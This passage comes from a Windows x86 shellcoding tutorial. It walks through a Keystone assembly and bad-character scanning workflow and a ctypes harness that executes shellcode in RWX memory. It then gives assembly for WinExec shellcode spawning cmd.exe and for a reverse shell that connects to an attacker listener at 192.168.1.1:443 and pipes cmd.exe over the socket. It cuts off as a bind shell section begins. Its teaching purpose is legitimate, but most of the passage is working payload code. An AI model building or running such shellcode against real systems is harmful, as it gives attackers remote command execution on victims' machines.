  <line x1="630" y1="90" x2="665" y2="90" stroke="#00ff88" stroke-width="2" marker-end="url(#dev-a)"/>
  <!-- Step 5: Debug -->
  <rect x="510" y="150" width="120" height="60" rx="8" fill="#151b28" stroke="#ff6b35" stroke-width="2"/>
  <text x="570" y="175" text-anchor="middle" fill="#ff6b35" font-size="12" font-weight="bold">5. Debug</text>
  <text x="570" y="192" text-anchor="middle" fill="#e0e7ff" font-size="10">WinDbg</text>
  <!-- Step 6: Fix -->
  <rect x="190" y="150" width="120" height="60" rx="8" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="250" y="175" text-anchor="middle" fill="#ff3366" font-size="12" font-weight="bold">6. Fix</text>
  <text x="250" y="192" text-anchor="middle" fill="#e0e7ff" font-size="10">Adjust ASM</text>
  <!-- Arrows for the loop -->
  <line x1="570" y1="120" x2="570" y2="145" stroke="#00ff88" stroke-width="2" marker-end="url(#dev-a)"/>
  <line x1="510" y1="180" x2="315" y2="180" stroke="#ff3366" stroke-width="2" marker-end="url(#dev-r)"/>
  <path d="M 250,150 L 250,120" stroke="#ff3366" stroke-width="2" marker-end="url(#dev-r)"/>
  <!-- Annotations -->
  <rect x="90" y="240" width="570" height="40" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="375" y="260" text-anchor="middle" fill="#00ff88" font-size="12">Each iteration takes under a minute. Fix -> Reassemble -> Retest until clean.</text>
  <text x="375" y="276" text-anchor="middle" fill="#8b949e" font-size="10">Repeat steps 2-6 until no bad characters and the payload works correctly.</text>
</svg></div>

*Figure 8.1 - The shellcode development cycle: write, assemble, scan, execute, debug, fix, repeat.*

### Assembling with Keystone

Keystone converts our NASM assembly into raw machine code bytes.

```python
from keystone import Ks, KS_ARCH_X86, KS_MODE_32

CODE = """
start:
    mov   ebp, esp
    add   esp, 0xfffff9f0
    ; ... rest of shellcode ...
"""

ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)
shellcode = bytes(encoding)
print(f"[+] Assembled {count} instructions, {len(shellcode)} bytes")
```

### Bad Character Scanner

After assembling, we scan the output for any byte that would break delivery.

```python
BAD_CHARS = set([0x00, 0x0a, 0x0d])

def check_bad_chars(shellcode, bad_chars):
    found = []
    for i, b in enumerate(shellcode):
        if b in bad_chars:
            found.append((i, b))
    if found:
        print("[!] Bad characters found:")
        for offset, byte in found:
            print(f"    Offset 0x{offset:04x}: 0x{byte:02x}")
    else:
        print("[+] No bad characters found!")
    return found
```

### Executing with ctypes

We allocate executable memory, copy our shellcode in, and jump to it.

```python
import ctypes

MEM_COMMIT = 0x1000
PAGE_EXECUTE_READWRITE = 0x40
ptr = ctypes.windll.kernel32.VirtualAlloc(
    0, len(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE
)
ctypes.windll.msvcrt.memcpy(ptr, shellcode, len(shellcode))
shellcode_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(ctypes.c_void_p))
shellcode_func()
```

<div align="center"><svg viewBox="0 0 750 220" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <marker id="ct-a" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="220" rx="10" fill="#0a0e17"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">ctypes Execution Flow</text>
  <rect x="30" y="55" width="160" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
  <text x="110" y="78" text-anchor="middle" fill="#00d4ff" font-size="11" font-weight="bold">VirtualAlloc</text>
  <text x="110" y="95" text-anchor="middle" fill="#e0e7ff" font-size="10">RWX memory page</text>
  <line x1="190" y1="82" x2="225" y2="82" stroke="#00ff88" stroke-width="2" marker-end="url(#ct-a)"/>
  <rect x="230" y="55" width="160" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
  <text x="310" y="78" text-anchor="middle" fill="#00d4ff" font-size="11" font-weight="bold">memcpy</text>
  <text x="310" y="95" text-anchor="middle" fill="#e0e7ff" font-size="10">Copy shellcode bytes</text>
  <line x1="390" y1="82" x2="425" y2="82" stroke="#00ff88" stroke-width="2" marker-end="url(#ct-a)"/>
  <rect x="430" y="55" width="160" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
  <text x="510" y="78" text-anchor="middle" fill="#00d4ff" font-size="11" font-weight="bold">CFUNCTYPE cast</text>
  <text x="510" y="95" text-anchor="middle" fill="#e0e7ff" font-size="10">Pointer to function</text>
  <line x1="590" y1="82" x2="625" y2="82" stroke="#00ff88" stroke-width="2" marker-end="url(#ct-a)"/>
  <rect x="630" y="55" width="90" height="55" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="675" y="78" text-anchor="middle" fill="#00ff88" font-size="11" font-weight="bold">Call!</text>
  <text x="675" y="95" text-anchor="middle" fill="#e0e7ff" font-size="10">Execute</text>
  <rect x="100" y="140" width="550" height="55" rx="6" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="375" y="162" text-anchor="middle" fill="#ff6b35" font-size="12" font-weight="bold">Memory Layout After Setup</text>
  <text x="375" y="182" text-anchor="middle" fill="#e0e7ff" font-size="11">[VirtualAlloc addr] -> [shellcode bytes copied here] -> EIP jumps here</text>
</svg></div>

*Figure 8.2 - The ctypes harness allocates RWX memory, copies shellcode in, then calls it as a function pointer.*

### Debugging with WinDbg

Insert `int3` at the start. Launch under WinDbg. Key commands: `t` (step), `r` (registers), `dd esp` (dump stack), `db esi` (display bytes), `u eip L20` (disassemble).

> **Development cycle:** Edit assembly, run Keystone, scan for bad chars, execute with ctypes, debug in WinDbg. Each iteration takes under a minute.

With our toolkit complete, we are ready to write real payloads.

---

## 9. Your First Shellcode: WinExec

Everything we have built so far has been infrastructure. Now we put it all to work and write shellcode that actually *does* something: pop a command shell with `WinExec`.

### The Game Plan

We resolve three functions from kernel32.dll, stashing each at a known EBP offset.

<div align="center"><svg viewBox="0 0 750 260" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <marker id="we-a" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="260" rx="10" fill="#0a0e17"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">WinExec: API Resolution Map</text>
  <!-- EBP variable table -->
  <rect x="30" y="50" width="280" height="180" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
  <text x="170" y="72" text-anchor="middle" fill="#00d4ff" font-size="12" font-weight="bold">EBP Variable Table</text>
  <rect x="45" y="82" width="250" height="28" rx="5" fill="#0d1117" stroke="#8b949e" stroke-width="1"/>
  <text x="170" y="100" text-anchor="middle" fill="#8b949e" font-size="11">[ebp+0x04] = find_function</text>
  <rect x="45" y="116" width="250" height="28" rx="5" fill="#0d1117" stroke="#ff3366" stroke-width="1.5"/>
  <text x="170" y="134" text-anchor="middle" fill="#ff3366" font-size="11">[ebp+0x10] = TerminateProcess</text>
  <rect x="45" y="150" width="250" height="28" rx="5" fill="#0d1117" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="170" y="168" text-anchor="middle" fill="#ff6b35" font-size="11">[ebp+0x14] = LoadLibraryA</text>
  <rect x="45" y="184" width="250" height="28" rx="5" fill="#0d1117" stroke="#00ff88" stroke-width="1.5"/>
  <text x="170" y="202" text-anchor="middle" fill="#00ff88" font-size="11">[ebp+0x18] = WinExec</text>
  <!-- Resolution arrows -->
  <rect x="400" y="82" width="310" height="42" rx="5" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
  <text x="555" y="100" text-anchor="middle" fill="#e0e7ff" font-size="11">push 0x78b5b983; call [ebp+0x04]</text>
  <text x="555" y="116" text-anchor="middle" fill="#ff3366" font-size="10">ROR13("TerminateProcess")</text>
  <line x1="400" y1="103" x2="300" y2="130" stroke="#ff3366" stroke-width="1.5" marker-end="url(#we-a)"/>
  <rect x="400" y="132" width="310" height="42" rx="5" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="555" y="150" text-anchor="middle" fill="#e0e7ff" font-size="11">push 0xec0e4e8e; call [ebp+0x04]</text>
  <text x="555" y="166" text-anchor="middle" fill="#ff6b35" font-size="10">ROR13("LoadLibraryA")</text>
  <line x1="400" y1="153" x2="300" y2="164" stroke="#ff6b35" stroke-width="1.5" marker-end="url(#we-a)"/>
  <rect x="400" y="182" width="310" height="42" rx="5" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="555" y="200" text-anchor="middle" fill="#e0e7ff" font-size="11">push 0x0e8afe98; call [ebp+0x04]</text>
  <text x="555" y="216" text-anchor="middle" fill="#00ff88" font-size="10">ROR13("WinExec")</text>
  <line x1="400" y1="203" x2="300" y2="198" stroke="#00ff88" stroke-width="1.5" marker-end="url(#we-a)"/>
  <text x="375" y="248" text-anchor="middle" fill="#8b949e" font-size="11">Three push+call+mov sequences fill the variable table</text>
</svg></div>

*Figure 9.1 - Each API is resolved by pushing its ROR-13 hash, calling find_function, and storing the result at a known EBP offset.*

```nasm
resolve_symbols_kernel32:
    push  0x78b5b983            ; TerminateProcess hash
    call  dword ptr [ebp+0x04]  ; find_function
    mov   [ebp+0x10], eax       ; save TerminateProcess

    push  0xec0e4e8e            ; LoadLibraryA hash
    call  dword ptr [ebp+0x04]  ; find_function
    mov   [ebp+0x14], eax       ; save LoadLibraryA

    push  0x0e8afe98            ; WinExec hash
    call  dword ptr [ebp+0x04]  ; find_function
    mov   [ebp+0x18], eax       ; save WinExec
```

### Building "cmd.exe" and Calling WinExec

We construct the string `"cmd.exe\0"` on the stack using two pushes, then call WinExec.

<div align="center"><svg viewBox="0 0 750 280" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <marker id="we-b" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="280" rx="10" fill="#0a0e17"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">Building "cmd.exe" on the Stack</text>
  <!-- String bytes -->
  <text x="375" y="55" text-anchor="middle" fill="#8b949e" font-size="11">Stack grows downward -- push in reverse order</text>
  <!-- Push 1: "exe\0" -->
  <rect x="70" y="70" width="610" height="50" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="130" y="90" text-anchor="middle" fill="#00d4ff" font-size="11" font-weight="bold">Step 1:</text>
  <text x="130" y="108" text-anchor="middle" fill="#e0e7ff" font-size="10">mov eax, 0x657865</text>
  <rect x="290" y="78" width="40" height="28" rx="5" fill="#0d1117" stroke="#00ff88" stroke-width="1"/>
  <text x="310" y="96" text-anchor="middle" fill="#00ff88" font-size="12">\0</text>
  <rect x="335" y="78" width="40" height="28" rx="5" fill="#0d1117" stroke="#ff3366" stroke-width="1"/>
  <text x="355" y="96" text-anchor="middle" fill="#ff3366" font-size="12">e</text>
  <rect x="380" y="78" width="40" height="28" rx="5" fill="#0d1117" stroke="#ff3366" stroke-width="1"/>
  <text x="400" y="96" text-anchor="middle" fill="#ff3366" font-size="12">x</text>
  <rect x="425" y="78" width="40" height="28" rx="5" fill="#0d1117" stroke="#ff3366" stroke-width="1"/>
  <text x="445" y="96" text-anchor="middle" fill="#ff3366" font-size="12">e</text>
  <text x="560" y="96" text-anchor="middle" fill="#e0e7ff" font-size="10">= 0x00657865 (high byte = \0)</text>
  <!-- Push 2: "cmd." -->
  <rect x="70" y="125" width="610" height="50" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="130" y="145" text-anchor="middle" fill="#00d4ff" font-size="11" font-weight="bold">Step 2:</text>
  <text x="130" y="163" text-anchor="middle" fill="#e0e7ff" font-size="10">push 0x2e646d63</text>
  <rect x="290" y="133" width="40" height="28" rx="5" fill="#0d1117" stroke="#ff6b35" stroke-width="1"/>
  <text x="310" y="151" text-anchor="middle" fill="#ff6b35" font-size="12">c</text>
  <rect x="335" y="133" width="40" height="28" rx="5" fill="#0d1117" stroke="#ff6b35" stroke-width="1"/>
  <text x="355" y="151" text-anchor="middle" fill="#ff6b35" font-size="12">m</text>
  <rect x="380" y="133" width="40" height="28" rx="5" fill="#0d1117" stroke="#ff6b35" stroke-width="1"/>
  <text x="400" y="151" text-anchor="middle" fill="#ff6b35" font-size="12">d</text>
  <rect x="425" y="133" width="40" height="28" rx="5" fill="#0d1117" stroke="#ff6b35" stroke-width="1"/>
  <text x="445" y="151" text-anchor="middle" fill="#ff6b35" font-size="12">.</text>
  <text x="560" y="151" text-anchor="middle" fill="#e0e7ff" font-size="10">= 0x2e646d63 (little-endian)</text>
  <!-- Result on stack -->
  <rect x="200" y="190" width="350" height="70" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="375" y="212" text-anchor="middle" fill="#00ff88" font-size="12" font-weight="bold">Stack (ESP points here):</text>
  <text x="375" y="232" text-anchor="middle" fill="#e0e7ff" font-size="14">c m d . e x e \0</text>
  <text x="375" y="250" text-anchor="middle" fill="#8b949e" font-size="10">mov esi, esp --> ESI points to "cmd.exe"</text>
</svg></div>

*Figure 9.2 - String construction: push DWORDs in reverse order so the string reads forward at ESP.*

```nasm
call_winexec:
    xor   eax, eax             ; EAX = 0
    mov   eax, 0x657865        ; EAX = 0x00657865 = "exe\0"
    push  eax
    push  0x2e646d63           ; push "cmd."
    mov   esi, esp             ; ESI -> "cmd.exe\0"

    xor   eax, eax
    mov   eax, 0x5             ; uCmdShow = SW_SHOW (5)
    push  eax
    push  esi                  ; pointer to "cmd.exe"
    call  dword ptr [ebp+0x18]; call WinExec
```

That is it. When this shellcode runs, a `cmd.exe` window appears. Roughly 120 bytes of machine code.

### PoC Video

The following video demonstrates the WinExec shellcode launching calc.exe in action:

<div align="center">
  <video width="720" controls>
    <source src="/assets/video/shellcoding/winexec-poc.mp4" type="video/mp4">
    Your browser does not support the video tag.
  </video>
</div>

*Video: WinExec shellcode popping calc.exe*

---

## 10. Reverse Shell: Calling Home

A **reverse shell** is the workhorse of remote exploitation. The target reaches out to a listener the attacker already has running, punching through firewalls that block inbound connections.

The high-level flow has six steps, each building on the last.

<div align="center"><svg viewBox="0 0 750 180" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <marker id="rs-a" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="180" rx="10" fill="#0a0e17"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">Reverse Shell: 6-Step Pipeline</text>
  <rect x="15" y="55" width="108" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="69" y="76" text-anchor="middle" fill="#00d4ff" font-size="10" font-weight="bold">1. Load DLL</text>
  <text x="69" y="94" text-anchor="middle" fill="#e0e7ff" font-size="9">ws2_32.dll</text>
  <line x1="123" y1="82" x2="138" y2="82" stroke="#00ff88" stroke-width="1.5" marker-end="url(#rs-a)"/>
  <rect x="140" y="55" width="108" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="194" y="76" text-anchor="middle" fill="#00d4ff" font-size="10" font-weight="bold">2. WSAStartup</text>
  <text x="194" y="94" text-anchor="middle" fill="#e0e7ff" font-size="9">Init Winsock</text>
  <line x1="248" y1="82" x2="263" y2="82" stroke="#00ff88" stroke-width="1.5" marker-end="url(#rs-a)"/>
  <rect x="265" y="55" width="108" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="319" y="76" text-anchor="middle" fill="#00d4ff" font-size="10" font-weight="bold">3. WSASocketA</text>
  <text x="319" y="94" text-anchor="middle" fill="#e0e7ff" font-size="9">TCP socket</text>
  <line x1="373" y1="82" x2="388" y2="82" stroke="#00ff88" stroke-width="1.5" marker-end="url(#rs-a)"/>
  <rect x="390" y="55" width="108" height="55" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="444" y="76" text-anchor="middle" fill="#ff3366" font-size="10" font-weight="bold">4. connect()</text>
  <text x="444" y="94" text-anchor="middle" fill="#e0e7ff" font-size="9">To attacker</text>
  <line x1="498" y1="82" x2="513" y2="82" stroke="#00ff88" stroke-width="1.5" marker-end="url(#rs-a)"/>
  <rect x="515" y="55" width="108" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="569" y="76" text-anchor="middle" fill="#00d4ff" font-size="10" font-weight="bold">5. STARTUPINFO</text>
  <text x="569" y="94" text-anchor="middle" fill="#e0e7ff" font-size="9">stdio = socket</text>
  <line x1="623" y1="82" x2="638" y2="82" stroke="#00ff88" stroke-width="1.5" marker-end="url(#rs-a)"/>
  <rect x="640" y="55" width="96" height="55" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="688" y="76" text-anchor="middle" fill="#00ff88" font-size="10" font-weight="bold">6. Spawn</text>
  <text x="688" y="94" text-anchor="middle" fill="#e0e7ff" font-size="9">cmd.exe</text>
  <rect x="120" y="130" width="510" height="35" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1" stroke-dasharray="4,3"/>
  <text x="375" y="152" text-anchor="middle" fill="#8b949e" font-size="11">Steps 1-3 build the connection infrastructure; Steps 4-6 establish the interactive shell</text>
</svg></div>

*Figure 10.0 - The six-step reverse shell pipeline: load Winsock, initialize, create socket, connect, configure stdio, spawn shell.*

### Loading ws2_32.dll and Resolving Winsock Functions

We build the string `"ws2_32.dll"` on the stack and call `LoadLibraryA`.

```nasm
load_ws2_32:
    xor   eax, eax
    push  eax                  ; null terminator
    xor   eax, eax
    mov   ax, 0x6c6c
    push  eax                  ; "ll\0\0"
    push  0x642e3233           ; "32.d"
    push  0x5f327377           ; "ws2_"
    push  esp
    call  dword ptr [ebp+0x08] ; LoadLibraryA("ws2_32.dll")
    mov   ebx, eax             ; save ws2_32 base in EBX
```

### Building sockaddr_in with NOT Encoding

The `sockaddr_in` structure tells `connect()` where to call home. We must build it without null bytes.

<div align="center"><svg viewBox="0 0 750 280" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <rect width="750" height="280" rx="10" fill="#0a0e17"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">sockaddr_in Memory Layout (16 bytes)</text>
  <text x="375" y="52" text-anchor="middle" fill="#8b949e" font-size="11">Pushed in reverse order so fields read correctly at ESP</text>
  <!-- Byte grid header -->
  <text x="110" y="80" text-anchor="middle" fill="#8b949e" font-size="10">Offset</text>
  <text x="220" y="80" text-anchor="middle" fill="#8b949e" font-size="10">Byte 0</text>
  <text x="310" y="80" text-anchor="middle" fill="#8b949e" font-size="10">Byte 1</text>
  <text x="400" y="80" text-anchor="middle" fill="#8b949e" font-size="10">Byte 2</text>
  <text x="490" y="80" text-anchor="middle" fill="#8b949e" font-size="10">Byte 3</text>
  <text x="620" y="80" text-anchor="middle" fill="#8b949e" font-size="10">Field</text>
  <!-- Row 1: sin_family + sin_port -->
  <rect x="60" y="90" width="80" height="32" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
  <text x="100" y="110" text-anchor="middle" fill="#00d4ff" font-size="11">+0x00</text>
  <rect x="170" y="90" width="80" height="32" rx="5" fill="#0d1117" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="210" y="110" text-anchor="middle" fill="#ff6b35" font-size="11">0x02</text>
  <rect x="260" y="90" width="80" height="32" rx="5" fill="#0d1117" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="300" y="110" text-anchor="middle" fill="#ff6b35" font-size="11">0x00</text>
  <rect x="350" y="90" width="80" height="32" rx="5" fill="#0d1117" stroke="#ff3366" stroke-width="1.5"/>
  <text x="390" y="110" text-anchor="middle" fill="#ff3366" font-size="11">0x01</text>
  <rect x="440" y="90" width="80" height="32" rx="5" fill="#0d1117" stroke="#ff3366" stroke-width="1.5"/>
  <text x="480" y="110" text-anchor="middle" fill="#ff3366" font-size="11">0xBB</text>
  <text x="620" y="106" text-anchor="middle" fill="#ff6b35" font-size="10">sin_family=2</text>
  <text x="620" y="118" text-anchor="middle" fill="#ff3366" font-size="10">sin_port=443</text>
  <!-- Row 2: sin_addr -->
  <rect x="60" y="128" width="80" height="32" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
  <text x="100" y="148" text-anchor="middle" fill="#00d4ff" font-size="11">+0x04</text>
  <rect x="170" y="128" width="80" height="32" rx="5" fill="#0d1117" stroke="#00ff88" stroke-width="1.5"/>
  <text x="210" y="148" text-anchor="middle" fill="#00ff88" font-size="11">0xC0</text>
  <rect x="260" y="128" width="80" height="32" rx="5" fill="#0d1117" stroke="#00ff88" stroke-width="1.5"/>
  <text x="300" y="148" text-anchor="middle" fill="#00ff88" font-size="11">0xA8</text>
  <rect x="350" y="128" width="80" height="32" rx="5" fill="#0d1117" stroke="#00ff88" stroke-width="1.5"/>
  <text x="390" y="148" text-anchor="middle" fill="#00ff88" font-size="11">0x01</text>
  <rect x="440" y="128" width="80" height="32" rx="5" fill="#0d1117" stroke="#00ff88" stroke-width="1.5"/>
  <text x="480" y="148" text-anchor="middle" fill="#00ff88" font-size="11">0x01</text>
  <text x="620" y="148" text-anchor="middle" fill="#00ff88" font-size="10">192.168.1.1</text>
  <!-- Row 3: sin_zero -->
  <rect x="60" y="166" width="80" height="32" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
  <text x="100" y="186" text-anchor="middle" fill="#00d4ff" font-size="11">+0x08</text>
  <rect x="170" y="166" width="350" height="32" rx="5" fill="#0d1117" stroke="#8b949e" stroke-width="1"/>
  <text x="345" y="186" text-anchor="middle" fill="#8b949e" font-size="11">0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00</text>
  <text x="620" y="186" text-anchor="middle" fill="#8b949e" font-size="10">sin_zero (padding)</text>
  <!-- NOT encoding note -->
  <rect x="80" y="215" width="590" height="48" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
  <text x="375" y="235" text-anchor="middle" fill="#ff3366" font-size="11" font-weight="bold">NOT Encoding for sin_family + sin_port (0xBB010002):</text>
  <text x="375" y="252" text-anchor="middle" fill="#e0e7ff" font-size="11">push 0x44fefffd -> pop eax -> not eax -> 0xBB010002 (no null bytes!)</text>
</svg></div>

*Figure 10.1 - The sockaddr_in struct has sin_family (AF_INET=2), sin_port (443 in network byte order), and sin_addr (target IP). NOT encoding avoids the null byte in 0xBB010002.*

```nasm
    xor   eax, eax
    push  eax                   ; sin_zero padding
    push  eax
    push  0x0101a8c0            ; sin_addr = 192.168.1.1 (little-endian)

    ; Encode 0xBB010002 without null bytes
    push  0x44fefffd            ; NOT(0xBB010002)
    pop   eax
    not   eax                   ; EAX = 0xBB010002
    push  eax                   ; sin_port (443) + sin_family (AF_INET)
    mov   esi, esp              ; ESI -> sockaddr_in
```

### STARTUPINFOA: Redirecting stdio to the Socket

The critical fields: `dwFlags = 0x100` (STARTF_USESTDHANDLES), and `hStdInput/hStdOutput/hStdError` all set to the socket handle. This is what makes the shell interactive over the network.

```nasm
    push  dword ptr [ebp+0x20] ; hStdError  = SOCKET
    push  dword ptr [ebp+0x20] ; hStdOutput = SOCKET
    push  dword ptr [ebp+0x20] ; hStdInput  = SOCKET
    push  ecx                   ; lpReserved2 = NULL
    push  ecx                   ; wShowWindow + cbReserved2

    push  0xfffffeff            ; NOT(0x100)
    pop   eax
    not   eax                   ; EAX = STARTF_USESTDHANDLES
    push  eax                   ; dwFlags
```

> `bInheritHandles = TRUE` in CreateProcessA is non-negotiable. Without it, the child process does not inherit the socket handle, and the stdio redirect silently fails.

<div align="center"><svg viewBox="0 0 750 420" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
<defs>
  <marker id="arrow-g" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  <marker id="arrow-o" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#ff6b35"/></marker>
</defs>
<rect width="750" height="420" rx="8" fill="#0a0e17"/>
<text x="375" y="30" text-anchor="middle" fill="#e0e7ff" font-size="16" font-weight="bold">Reverse Shell Architecture</text>
<rect x="30" y="60" width="200" height="130" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
<text x="130" y="85" text-anchor="middle" fill="#e0e7ff" font-size="13" font-weight="bold">ATTACKER</text>
<text x="130" y="108" text-anchor="middle" fill="#ff6b35" font-size="11">192.168.1.1:443</text>
<text x="130" y="130" text-anchor="middle" fill="#e0e7ff" font-size="11">nc -lvnp 443</text>
<text x="130" y="155" text-anchor="middle" fill="#00ff88" font-size="11">LISTENING...</text>
<rect x="520" y="60" width="200" height="130" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
<text x="620" y="85" text-anchor="middle" fill="#e0e7ff" font-size="13" font-weight="bold">TARGET</text>
<text x="620" y="108" text-anchor="middle" fill="#ff6b35" font-size="11">Exploited Process</text>
<text x="620" y="130" text-anchor="middle" fill="#e0e7ff" font-size="11">Shellcode runs:</text>
<text x="620" y="150" text-anchor="middle" fill="#00ff88" font-size="10">WSAStartup, WSASocketA</text>
<text x="620" y="165" text-anchor="middle" fill="#00ff88" font-size="10">connect() --></text>
<line x1="520" y1="125" x2="240" y2="125" stroke="#00ff88" stroke-width="2" marker-end="url(#arrow-g)" stroke-dasharray="8,4"/>
<text x="375" y="115" text-anchor="middle" fill="#00ff88" font-size="11">TCP connect()</text>
<rect x="520" y="230" width="200" height="80" rx="6" fill="#151b28" stroke="#ff6b35" stroke-width="2"/>
<text x="620" y="255" text-anchor="middle" fill="#e0e7ff" font-size="13" font-weight="bold">cmd.exe</text>
<text x="620" y="275" text-anchor="middle" fill="#e0e7ff" font-size="11">CreateProcessA()</text>
<text x="620" y="295" text-anchor="middle" fill="#ff6b35" font-size="10">inherits socket handle</text>
<line x1="620" y1="190" x2="620" y2="225" stroke="#ff6b35" stroke-width="2" marker-end="url(#arrow-o)"/>
<rect x="275" y="240" width="200" height="100" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
<text x="375" y="262" text-anchor="middle" fill="#ff3366" font-size="12" font-weight="bold">STARTUPINFOA</text>
<text x="375" y="282" text-anchor="middle" fill="#e0e7ff" font-size="10">hStdInput  = SOCKET</text>
<text x="375" y="297" text-anchor="middle" fill="#e0e7ff" font-size="10">hStdOutput = SOCKET</text>
<text x="375" y="312" text-anchor="middle" fill="#e0e7ff" font-size="10">hStdError  = SOCKET</text>
<text x="375" y="330" text-anchor="middle" fill="#ff3366" font-size="10">dwFlags = 0x100</text>
<line x1="275" y1="280" x2="130" y2="195" stroke="#00ff88" stroke-width="2" marker-end="url(#arrow-g)"/>
<text x="375" y="390" text-anchor="middle" fill="#e0e7ff" font-size="12">Attacker types commands -> socket -> cmd.exe stdin</text>
<text x="375" y="408" text-anchor="middle" fill="#e0e7ff" font-size="12">cmd.exe stdout -> socket -> attacker sees output</text>
</svg></div>

*Figure 10.2 - Reverse shell data flow: the target connects out to the attacker, and STARTUPINFOA redirects all stdio through the socket.*

### PoC Video

The following video demonstrates the reverse shell shellcode connecting back to our listener and providing an interactive command prompt in action:

<div align="center">
  <video width="720" controls>
    <source src="/assets/video/shellcoding/reverse-shell-poc.mp4" type="video/mp4">
    Your browser does not support the video tag.
  </video>
</div>

*Video: Reverse shell connecting back to attacker*

---

## 11. Bind Shell: Waiting for Connections

A **bind shell** is the mirror image of a reverse shell. Instead of connecting out, the shellcode opens a port on the target and waits for the attacker to connect in.

The bind shell trades `connect` for three new functions: `bind`, `listen`, and `accept`. It also uses `WaitForSingleObject` to keep the shellcode alive.

### The rep stosb Zeroing Technique

We need to zero out 68 bytes for the `STARTUPINFOA` structure. Rather than pushing 17 individual zero DWORDs, we use `rep stosb`.

<div align="center"><svg viewBox="0 0 750 230" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <marker id="bs-a" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="230" rx="10" fill="#0a0e17"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">rep stosb: Fast Memory Zeroing</text>
  <!-- Before -->
  <text x="100" y="58" text-anchor="middle" fill="#ff6b35" font-size="11" font-weight="bold">Before</text>
  <rect x="30" y="68" width="28" height="28" rx="2" fill="#151b28" stroke="#ff3366" stroke-width="1"/>
  <text x="44" y="86" text-anchor="middle" fill="#ff3366" font-size="9">??</text>
  <rect x="62" y="68" width="28" height="28" rx="2" fill="#151b28" stroke="#ff3366" stroke-width="1"/>
  <text x="76" y="86" text-anchor="middle" fill="#ff3366" font-size="9">??</text>
  <rect x="94" y="68" width="28" height="28" rx="2" fill="#151b28" stroke="#ff3366" stroke-width="1"/>
